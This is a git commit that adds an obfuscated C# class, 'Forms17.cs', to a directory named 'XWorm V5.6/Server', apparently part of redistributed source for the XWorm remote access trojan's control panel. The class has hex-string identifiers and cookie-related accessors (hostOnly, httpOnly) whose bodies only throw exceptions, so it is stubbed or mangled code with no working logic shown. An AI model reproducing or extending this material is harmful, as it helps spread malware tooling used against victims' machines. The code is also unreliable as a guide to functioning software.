3c4d6ab37d440005b897c93268e36174c5d1cb16
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:07 +0400

    Forms17.cs

---
+++ XWorm V5.6/Server/Forms/Forms17.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+
+namespace MEA9MCF25F24475D52DDBEE8F296A691
+{
+  public class D0390509B52C44661FC1BBD32C057C4B
+  {
+    public static int CF84980BF9D96176DCC270568F658801;
+    public static int L1DB0A0ALF724884AAE523A8BE2F681B;
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_hostOnly(bool AutoPropertyValue) => throw new Exception("ま");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public bool get_httpOnly() => throw new Exception("や");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_httpOnly(bool AutoPropertyValue) => throw new Exception("ぁ");
+
+    public delegate void _Read();
+  }
+}
